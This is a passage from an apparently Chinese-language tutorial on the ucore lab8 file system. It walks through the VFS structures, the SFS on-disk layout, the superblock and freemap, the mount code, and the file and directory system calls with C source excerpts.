<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">filesp</span>;</span>                <span class="comment">// the file related info(pwd, files_count, files_array, fs_semaphore) of process</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>files_struct</code>数据结构定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">pwd</span>;</span>      <span class="comment">// inode of present working directory</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">fd_array</span>;</span>  <span class="comment">// opened files array</span></span><br><span class="line">    <span class="keyword">int</span> files_count;        <span class="comment">// the number of opened files</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> files_sem;  <span class="comment">// lock protect sem</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/08/31/uDwSmTabAkN8dZJ.png"></p>
<p><code>inode</code>数据结构定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">device</span> __<span class="title">device_info</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> __<span class="title">sfs_inode_info</span>;</span></span><br><span class="line">    &#125; in_info;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">        inode_type_device_info = <span class="number">0x1234</span>,</span><br><span class="line">        inode_type_sfs_inode_info,</span><br><span class="line">    &#125; in_type;</span><br><span class="line">    <span class="keyword">int</span> ref_count;</span><br><span class="line">    <span class="keyword">int</span> open_count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs</span> *<span class="title">in_fs</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> *<span class="title">in_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>sfs_inode</code>数据结构定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* inode for sfs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span>;</span>                     <span class="comment">/* on-disk inode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ino;                                   <span class="comment">/* inode number */</span></span><br><span class="line">    <span class="keyword">bool</span> dirty;                                     <span class="comment">/* true if inode modified */</span></span><br><span class="line">    <span class="keyword">int</span> reclaim_count;                              <span class="comment">/* kill inode if it hits zero */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> sem;                                <span class="comment">/* semaphore for din */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> inode_link;                        <span class="comment">/* entry for linked-list in sfs_fs */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> hash_link;                         <span class="comment">/* entry for hash linked-list in sfs_fs */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>sfs_disk_inode</code>定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* inode (on disk) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> size;                                  <span class="comment">/* size of the file (in bytes) */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> type;                                  <span class="comment">/* one of SYS_TYPE_* above */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> nlinks;                                <span class="comment">/* # of hard links to this file */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> blocks;                                <span class="comment">/* # of blocks */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> direct[SFS_NDIRECT];                   <span class="comment">/* direct blocks */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> indirect;                              <span class="comment">/* indirect blocks */</span></span><br><span class="line"><span class="comment">//    uint32_t db_indirect;                           /* double indirect blocks */</span></span><br><span class="line"><span class="comment">//   unused</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/08/31/BAlS6qjfxodVGZY.png"></p>
<h1 id="通用文件系统访问接口"><a href="#通用文件系统访问接口" class="headerlink" title="通用文件系统访问接口"></a>通用文件系统访问接口</h1><p>lab8中定义了一系列与文件系统有关的用户函数，首先讨论对单个文件进行操作的系统调用。</p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">open(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags) &#123;</span><br><span class="line">    <span class="keyword">return</span> sys_open(path, open_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">close(<span class="keyword">int</span> fd) &#123;</span><br><span class="line">    <span class="keyword">return</span> sys_close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len) &#123;</span><br><span class="line">    <span class="keyword">return</span> sys_read(fd, base, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">write(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len) &#123;</span><br><span class="line">    <span class="keyword">return</span> sys_write(fd, base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在文件操作方面，最基本的相关函数为<code>open</code>、<code>close</code>、<code>read</code>、<code>write</code>。在读写一个文件之前，首先调用open系统调用将文件打开。open的第一个参数指定文件的路径名，可使用绝对路径名，第二个参数指定打开的方式，可设置为<code>O_RDONLY</code>，<code>O_WRONLY</code>，<code>O_RDWR</code>，分别表示只读，只写，可读可写。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* VFS flags */</span></span><br><span class="line"><span class="comment">// flags for open: choose one of these</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDONLY            0           <span class="comment">// open for reading only</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_WRONLY            1           <span class="comment">// open for writing only</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDWR              2           <span class="comment">// open for reading and writing</span></span></span><br><span class="line"><span class="comment">// then or in any of these:</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_CREAT             0x00000004  <span class="comment">// create file if it does not exist</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_EXCL              0x00000008  <span class="comment">// error if O_CREAT and the file exists</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_TRUNC             0x00000010  <span class="comment">// truncate file upon open</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_APPEND            0x00000020  <span class="comment">// append on each write</span></span></span><br><span class="line"><span class="comment">// additonal related definition</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_ACCMODE           3           <span class="comment">// mask for O_RDONLY / O_WRONLY / O_RDWR</span></span></span><br></pre></td></tr></table></figure>
<p>读写文件内容的系统调用是<code>read</code>和<code>write</code>。<code>read</code>调用有三个参数：一个指定所操作的文件描述符，一个指定读取数据的存放地址，最后一个指定读多少字节。</p>
<p>在c语言中对应的系统调用为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">count &#x3D; read(filehandle, buffer, nbytes);</span><br></pre></td></tr></table></figure>
<p>该系统调用将实际读到的字节数返回给<code>count</code>变量。在正常情况下与<code>nbytes</code>相等，但有时可能会小一些。例如，读文件直到文件结束符的位置，从而提前结束此次读操作。若由于参数无效或者磁盘访问错误等原因此次系统调用失败，则<code>count</code>置为-1,<code>write</code>函数的参数与<code>read</code>函数一样。</p>
<p>接下来是对目录的操作。</p>
<h2 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h2><p>对于目录而言，最常用的操作是跳转到某个目录，对应的用户库函数为<code>chdir</code>，然后读目录的内容，即列出目录中的文件或目录名，在操作上与读文件类似，首先通过<code>opendir</code>打开目录，通过<code>readdir</code>来读取目录中的文件信息，读完后再调用<code>closedir</code>来关闭目录。由于在ucore中，目录为特殊的文件，所以<code>opendir</code>和<code>closedir</code>实际上是调用文件相关的<code>open</code>和<code>close</code>函数。只有<code>readdir</code>需要调用获取目录内容的特殊系统调用<code>sys_getdirentry</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DIR dir, *dirp=&amp;dir;</span><br><span class="line">DIR *</span><br><span class="line">opendir(<span class="keyword">const</span> <span class="keyword">char</span> *path) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((dirp-&gt;fd = open(path, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> __<span class="title">stat</span>, *<span class="title">stat</span> =</span> &amp;__stat;</span><br><span class="line">    <span class="keyword">if</span> (fstat(dirp-&gt;fd, stat) != <span class="number">0</span> || !S_ISDIR(stat-&gt;st_mode)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line">    dirp-&gt;dirent.offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> dirp;</span><br><span class="line"></span><br><span class="line">failed:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *</span></span><br><span class="line"><span class="class"><span class="title">readdir</span>(<span class="title">DIR</span> *<span class="title">dirp</span>) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (sys_getdirentry(dirp-&gt;fd, &amp;(dirp-&gt;dirent)) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &amp;(dirp-&gt;dirent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">closedir(DIR *dirp) &#123;</span><br><span class="line">    close(dirp-&gt;fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与文件相关的<code>open</code>、<code>close</code>、<code>read</code>、<code>write</code>用户库函数对应的是<code>sys_open</code>、<code>sys_close</code>、<code>sys_read</code>、<code>sys_write</code>四个系统调用接口。与目录相关的<code>readdir</code>用户库函数对应的是<code>sys_getdirentry</code>系统调用。这些系统调用函数接口将通过<code>syscall</code>函数来获得ucore的内核服务。在内核态时调用文件系统抽象层的文件和目录接口。</p>
<h1 id="文件系统抽象层"><a href="#文件系统抽象层" class="headerlink" title="文件系统抽象层"></a>文件系统抽象层</h1><p>文件系统抽象层将不同文件系统对外共性接口提取出来，与之前类似，以函数指针的形式封装，从而是通用文件系统访问层只需访问文件系统抽象层而不用关注具体实现。</p>
<h2 id="文件和目录接口"><a href="#文件和目录接口" class="headerlink" title="文件和目录接口"></a>文件和目录接口</h2><p>文件、目录接口层定义了进程在内核中直接访问的文件相关信息，在<code>file</code>数据结构中定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">        FD_NONE, FD_INIT, FD_OPENED, FD_CLOSED,</span><br><span class="line">    &#125; status;</span><br><span class="line">    <span class="keyword">bool</span> readable;</span><br><span class="line">    <span class="keyword">bool</span> writable;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">off_t</span> pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">int</span> open_count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当创建一个进程后，该进程的<code>files_struct</code> 会被初始化或复制当前父进程的<code>files_struct</code>。当用户进程打开一个文件时，将从<code>fd_array</code>数组中取出一个空闲的file项，将此成员变量node指针指向一个代表此文件的inode起始地址。</p>
<h2 id="inode接口"><a href="#inode接口" class="headerlink" title="inode接口"></a>inode接口</h2><p>inode(index node)是位于内存的节点，是文件的抽象表示，负责把不同文件系统的特定索引节点信息统一封装起来，避免了进程直接访问具体文件系统。</p>
<p>在inode中的成员变量<code>inode_ops</code>定义了一系列对<code>inode</code>的操作函数，具体描述如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vop_magic;</span><br><span class="line">    <span class="keyword">int</span> (*vop_open)(struct inode *node, <span class="keyword">uint32_t</span> open_flags);</span><br><span class="line">    <span class="keyword">int</span> (*vop_close)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_read)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_write)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_fstat)(struct inode *node, struct stat *stat);</span><br><span class="line">    <span class="comment">//返回文件的状态信息，返回指针指向stat数据结构</span></span><br><span class="line">    <span class="keyword">int</span> (*vop_fsync)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_namefile)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_getdirentry)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_reclaim)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_gettype)(struct inode *node, <span class="keyword">uint32_t</span> *type_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_tryseek)(struct inode *node, <span class="keyword">off_t</span> pos);</span><br><span class="line">    <span class="keyword">int</span> (*vop_truncate)(struct inode *node, <span class="keyword">off_t</span> len);</span><br><span class="line">    <span class="keyword">int</span> (*vop_create)(struct inode *node, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">bool</span> excl, struct inode **node_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_lookup)(struct inode *node, <span class="keyword">char</span> *path, struct inode **node_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_ioctl)(struct inode *node, <span class="keyword">int</span> op, <span class="keyword">void</span> *data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>inode_ops</code>是对常规文件、目录、设备文件所有操作的一个抽象函数表示。</p>
<h1 id="SFS文件系统"><a href="#SFS文件系统" class="headerlink" title="SFS文件系统"></a>SFS文件系统</h1><p>ucore将所有文件视为字节流，任何内部逻辑都是专用的，由应用程序负责解释，但是ucore在物理结构上对文件加以区分。ucore目前支持以下几种类型的文件：</p>
<ul>
<li>常规文件：文件中包括的内容信息是由应用程序输入。SFS文件系统在普通文件上不强加任何内部结构，把其文件内容信息看作为字节。</li>
<li>目录：包含一系列的entry，每个entry包含文件名和指向与之相关联的索引节点（index node）的指针。目录是按层次结构组织的。</li>
<li>链接文件：实际上一个链接文件是一个已经存在的文件的另一个可选择的文件名。</li>
<li>设备文件：不包含数据，但是提供了一个映射物理设备（如串口、键盘等）到一个文件名的机制。可通过设备文件访问外围设备。</li>
<li>管道：管道是进程间通讯的一个基础设施。管道缓存了其输入端所接受的数据，以便在管道输出端读的进程能一个先进先出的方式来接受数据。</li>
</ul>
<h2 id="文件系统的布局"><a href="#文件系统的布局" class="headerlink" title="文件系统的布局"></a>文件系统的布局</h2><p>文件系统通常保存在硬盘上，前两个磁盘分别是<code>ucore.img</code>和<code>swap.img</code>，第三个磁盘(disk 0)用于存放一个SFS文件系统。通常文件系统中磁盘的使用是以扇区为单位的，为了便于实现,SFS中以block(4K，与一页的大小相等)为基本单位。</p>
<p>SFS文件系统布局如下所示：</p>
<p><img src="https://i.loli.net/2019/09/01/xmzKW4QO2vntuwa.png"></p>
<p>第0块(4K)是超级块，包含了关于文件系统的所有关键参数。当计算机被启动或首次接触时，超级块的内容就会被装入内存。具体描述如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_super</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> magic;                                 <span class="comment">/* magic number, should be SFS_MAGIC */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> blocks;                                <span class="comment">/* # of blocks in fs */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> unused_blocks;                         <span class="comment">/* # of unused blocks in fs */</span></span><br><span class="line">    <span class="keyword">char</span> info[SFS_MAX_INFO_LEN + <span class="number">1</span>];                <span class="comment">/* infomation for sfs  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中magic的值在宏定义时给出，内核通过magic值来检查镜像是否为合法的SFS.img</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define SFS_MAGIC                                   0x2f8dbe2a   </span><br></pre></td></tr></table></figure>
<p>第1块放了root-dir的inode，用来记录根目录的相关信息。通过root-dir是sfs文件系统的根节点，通过root-dir的inode可以定位并查找到根目录下的所有文件信息。</p>
<p>从第2个块开始，用位图的形式来标记所有块的使用情况，每个块用1bit来标明，这个区域被称为是freemap区域。在<code>bitmap.h</code>中位图数据结构的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bitmap</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> nbits;</span><br><span class="line">    <span class="keyword">uint32_t</span> nwords;</span><br><span class="line">    WORD_TYPE *<span class="built_in">map</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>剩余的磁盘空间存放了所有其他目录和文件的inode信息和内容数据信息。这里每个inode都用一个完整的block来存储。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_do_mount(struct device *dev, struct fs **fs_store) &#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(SFS_BLKSIZE &gt;= <span class="keyword">sizeof</span>(struct sfs_super));</span><br><span class="line">    <span class="keyword">static_assert</span>(SFS_BLKSIZE &gt;= <span class="keyword">sizeof</span>(struct sfs_disk_inode));</span><br><span class="line">    <span class="keyword">static_assert</span>(SFS_BLKSIZE &gt;= <span class="keyword">sizeof</span>(struct sfs_disk_entry));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dev-&gt;d_blocksize != SFS_BLKSIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_NA_DEV;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* allocate fs structure */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs</span> *<span class="title">fs</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((fs = alloc_fs(sfs)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_fs</span> *<span class="title">sfs</span> =</span> fsop_info(fs, sfs);</span><br><span class="line">    sfs-&gt;dev = dev;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_MEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *sfs_buffer;</span><br><span class="line">    <span class="keyword">if</span> ((sfs-&gt;sfs_buffer = sfs_buffer = kmalloc(SFS_BLKSIZE)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> failed_cleanup_fs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* load and check superblock */</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = sfs_init_read(dev, SFS_BLKN_SUPER, sfs_buffer)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> failed_cleanup_sfs_buffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = -E_INVAL;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_super</span> *<span class="title">super</span> =</span> sfs_buffer;</span><br><span class="line">    <span class="keyword">if</span> (super-&gt;magic != SFS_MAGIC) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;sfs: wrong magic in superblock. (%08x should be %08x).\n&quot;</span>,</span><br><span class="line">                super-&gt;magic, SFS_MAGIC);</span><br><span class="line">        <span class="keyword">goto</span> failed_cleanup_sfs_buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (super-&gt;blocks &gt; dev-&gt;d_blocks) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;sfs: fs has %u blocks, device has %u blocks.\n&quot;</span>,</span><br><span class="line">                super-&gt;blocks, dev-&gt;d_blocks);</span><br><span class="line">        <span class="keyword">goto</span> failed_cleanup_sfs_buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    super-&gt;info[SFS_MAX_INFO_LEN] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    sfs-&gt;super = *super;</span><br><span class="line"></span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* alloc and initialize hash list */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *hash_list;</span><br><span class="line">    <span class="keyword">if</span> ((sfs-&gt;hash_list = hash_list = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">list_entry_t</span>) * SFS_HLIST_SIZE)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> failed_cleanup_sfs_buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SFS_HLIST_SIZE; i ++) &#123;</span><br><span class="line">        list_init(hash_list + i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* load and check freemap */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bitmap</span> *<span class="title">freemap</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> freemap_size_nbits = sfs_freemap_bits(super);</span><br><span class="line">    <span class="keyword">if</span> ((sfs-&gt;freemap = freemap = bitmap_create(freemap_size_nbits)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> failed_cleanup_hash_list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint32_t</span> freemap_size_nblks = sfs_freemap_blocks(super);</span><br><span class="line">    <span class="keyword">if</span> ((ret = sfs_init_freemap(dev, freemap, SFS_BLKN_FREEMAP, freemap_size_nblks, sfs_buffer)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> failed_cleanup_freemap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> blocks = sfs-&gt;super.blocks, unused_blocks = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; freemap_size_nbits; i ++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bitmap_test(freemap, i)) &#123;</span><br><span class="line">            unused_blocks ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(unused_blocks == sfs-&gt;super.unused_blocks);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* and other fields */</span></span><br><span class="line">    sfs-&gt;super_dirty = <span class="number">0</span>;</span><br><span class="line">    sem_init(&amp;(sfs-&gt;fs_sem), <span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;(sfs-&gt;io_sem), <span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;(sfs-&gt;mutex_sem), <span class="number">1</span>);</span><br><span class="line">    list_init(&amp;(sfs-&gt;inode_list));</span><br><span class="line">    cprintf(<span class="string">&quot;sfs: mount: &#x27;%s&#x27; (%d/%d/%d)\n&quot;</span>, sfs-&gt;super.info,</span><br><span class="line">            blocks - unused_blocks, unused_blocks, blocks);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* link addr of sync/get_root/unmount/cleanup funciton  fs&#x27;s function pointers*/</span></span><br><span class="line">    fs-&gt;fs_sync = sfs_sync;</span><br><span class="line">    fs-&gt;fs_get_root = sfs_get_root;</span><br><span class="line">    fs-&gt;fs_unmount = sfs_unmount;</span><br><span class="line">    fs-&gt;fs_cleanup = sfs_cleanup;</span><br><span class="line">    *fs_store = fs;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">failed_cleanup_freemap:</span><br><span class="line">    bitmap_destroy(freemap);</span><br><span class="line">failed_cleanup_hash_list:</span><br><span class="line">    kfree(hash_list);</span><br><span class="line">failed_cleanup_sfs_buffer:</span><br><span class="line">    kfree(sfs_buffer);</span><br><span class="line">failed_cleanup_fs:</span><br><span class="line">    kfree(fs);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>sfs_fs.c</code> 文件的<code>sfs_do_mount</code> 函数中，加载了位于硬盘上的SFS的<code>superblock</code>和<code>freemap</code>信息，这样一来，在内存中就有了sfs文件系统的全局信息。</p>
<h2 id="索引节点接口"><a href="#索引节点接口" class="headerlink" title="索引节点接口"></a>索引节点接口</h2><p>在sfs文件系统中，需要记录文件内容的存储位置和文件名与文件内容的对应关系。<code>sfs_disk_inode</code> 记录了文件或目录的内容存储的索引信息。</p>
<p><strong>磁盘索引节点</strong></p>
<p><code>sfs_disk_inode</code> 代表了一个实际位于磁盘上的文件，如果inode表示的是文件，则成员变量direct直接指向了保存文件内容数据块的索引值，<code>indirect</code>指向间接数据块，此数据块存放数据块索引，数据块索引才被用于存放文件内容数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* inode (on disk) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> size;                                 <span class="comment">//文件大小</span></span><br><span class="line">    <span class="keyword">uint16_t</span> type;                                 <span class="comment">//文件类型</span></span><br><span class="line">    <span class="keyword">uint16_t</span> nlinks;                               <span class="comment">//硬链接数</span></span><br><span class="line">    <span class="keyword">uint32_t</span> blocks;                               <span class="comment">//数据块数</span></span><br><span class="line">    <span class="keyword">uint32_t</span> direct[SFS_NDIRECT];                  <span class="comment">//直接数据块索引值</span></span><br><span class="line">    <span class="keyword">uint32_t</span> indirect;                             <span class="comment">//一级间接数据块索引值</span></span><br><span class="line"><span class="comment">//    uint32_t db_indirect;                        //二级数据块索引值</span></span><br><span class="line"><span class="comment">//   unused</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>默认的，ucore 里 <code>SFS_NDIRECT</code> 是 12，即直接索引的数据页大小为 <code>12 * 4k = 48k</code>；当使用一级间接数据块索引时，ucore 支持最大的文件大小为 <code>12 * 4k + 1024 * 4k = 48k + 4m</code>。数据索引表内，0 表示一个无效的索引，inode 里 blocks 表示该文件或者目录占用的磁盘的 block 的个数。indiret 为 0 时，表示不使用一级索引块。（因为 block 0 用来保存 super block，不可能被其他任何文件或目录使用）。</p>
<p><code>sfs_disk_entry</code>表示一个目录中的文件或目录，与<code>sfs_inode</code>一样存储在硬盘，需要时读入内存。</p>
<p>对于普通文件，索引值指向的数据块中保存的是文件中的数据。而对于目录，索引值指向的数据块保存的是目录下所有的文件名以及对应的索引节点所在的索引块（磁盘块）所形成的数组。数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_entry</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ino;                               <span class="comment">//索引节点所占数据块索引值</span></span><br><span class="line">    <span class="keyword">char</span> name[SFS_MAX_FNAME_LEN + <span class="number">1</span>];           <span class="comment">//文件名</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>操作系统中，每个文件系统下的 inode 都应该分配唯一的 inode 编号。SFS 下，为了<del>偷懒</del>实现的简便，每个 inode 直接用所在的磁盘 block 的编号作为 inode 编号。比如，root block 的 inode 编号为 1；每个 <code>sfs_disk_entry</code> 数据结构中，name 表示目录下文件或文件夹的名称，ino 表示磁盘 block 编号，通过读取该 block 的数据，能够得到相应的文件或文件夹的 inode。ino 为0时，表示一个无效的 entry。</p>
<p><strong>内存索引节点</strong></p>
